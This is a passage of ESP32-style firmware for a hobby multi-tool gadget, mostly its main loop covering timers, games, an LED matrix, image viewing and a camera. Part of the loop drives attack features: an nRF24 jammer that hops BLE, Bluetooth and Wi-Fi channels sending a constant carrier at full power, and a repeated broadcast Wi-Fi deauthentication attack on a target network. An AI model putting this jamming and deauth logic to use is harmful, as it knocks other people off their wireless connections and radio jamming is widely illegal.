      uint32_t now = millis();
      if (now - lastNrfJamHopMs >= 10) { 
        uint8_t channel = 0;
        if (nrfJamMode == 0) channel = nrfJamBle[random(sizeof(nrfJamBle))];
        else if (nrfJamMode == 1) channel = nrfJamBt[random(sizeof(nrfJamBt))];
        else channel = nrfJamWifi[random(sizeof(nrfJamWifi))];
        nrfRadio.stopConstCarrier(); 
        nrfRadio.setChannel(channel);
        nrfRadio.startConstCarrier(RF24_PA_MAX, channel);
        lastNrfJamHopMs = now;
      }
    } else if (nrfJammingActive) {
      // For when sleep mode triggers
      nrfJammingActive = false;
      nrfRadio.stopConstCarrier();
      nrfRadio.powerDown();
      nrfRadio.powerUp();
      uiMarkDirty();
    }
  }
#endif
}

void loop() {
  if (deferredInitDone) server.handleClient();
  handleNrfJammer();
  wifiAutoConnectTick();

  if (deauthKilling) {
    uint32_t now = millis();
    if (now - lastDeauthSentMs >= 100) {
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      for(int i=0; i<3; i++) performDeauth(broadcast, deauthTargetBssid);
      deauthPacketsSent += 6; // 3 rounds * 2 frames each
      lastDeauthSentMs = now;
      if (uiScreen == UI_DEAUTH_ATTACK) uiMarkDirty();
    }
  }

  uiLoop();
  if (isSleepActive()) {
    if (!tftSleeping) {
      struct tm tmNow;
      if (getLocalTime(&tmNow, 0)) {
        if (tmNow.tm_min != lastSleepMinute) {
          lastSleepMinute = tmNow.tm_min;
          tftRefreshSleepScreen();
        }
      }
    }
    gifStop();
    cameraStop();
    delay(1);
    return;
  }
  (void)QMI8658_Loop();
  songLoop();
  noteLoop();
  timeTrySyncNtp();
  if (!tftSleeping && appMode == APP_UI) {
    if (uiScreen == UI_TOOL_STOPWATCH && stopwatchState.running) uiMarkDirty();
    if (uiScreen == UI_TOOL_TIMER && timerState.running) {
      uint32_t now = millis();
      if (now - timerState.lastTickMs >= 1000) {
        timerState.lastTickMs += 1000;
        if (timerState.remainingSeconds > 0) timerState.remainingSeconds--;
        if (timerState.remainingSeconds == 0) {
          timerState.running = false;
          timerState.finished = true;
          if (uiSfxEnabled && !songPlaying) {
            buzzerTone(1760, 120);
            delay(140);
            buzzerTone(2200, 180);
          }
        }
        uiMarkDirty();
      }
    }
  }
  if (appMode == APP_GAME) {
    gameLoop();
  } else if (appMode == APP_MATRIX_TEXT) {
    matrixTextLoop();
  } else if (waterMode) {
    if (!imuOn) QMI8658_SetEnabled(true);
    applyBrightnessIfDirty();
    waterStep();
  } else if (lampOn) {
    if (matrixDirty || brightnessDirty) {
      matrixCommitToPixels();
      matrixDirty = false;
    }
  } else {
    if (matrixDirty || brightnessDirty) {
      matrixCommitToPixels();
      matrixDirty = false;
    }
    if (matrixIdleDirty && appMode == APP_UI && !LittleFS.exists(MATRIX_PATH)) matrixShowIdleFace();
  }
  if (appMode == APP_UI && !tftSleeping) {
    struct tm tmNow;
    if (getLocalTime(&tmNow, 0)) {
      if (tmNow.tm_min != lastUiMinute) {
        lastUiMinute = tmNow.tm_min;
        uiMarkDirty();
      }
    }
  }
  if (!tftSleeping) {
    if (appMode == APP_VIEW_BMP) {
      if (tftDirty || mediaStamp != lastMediaStamp) {
        lastMediaStamp = mediaStamp;
        tftDirty = false;
        tftDrawBmpViewer();
      }
      gifStop();
      cameraStop();
    } else if (appMode == APP_VIEW_GIF) {
      if (tftDirty || mediaStamp != lastMediaStamp) {
        lastMediaStamp = mediaStamp;
        tftDirty = false;
        tftDrawGifStartOrError();
      }
      gifLoopStep();
      cameraStop();
    } else if (appMode == APP_CAMERA) {
      cameraLoop();
    } else if (appMode == APP_UI && tftDirty) {
      tftDirty = false;
      uiDirty = true;
    }
  } else {
    gifStop();
    cameraStop();
  }
  delay(1);
}
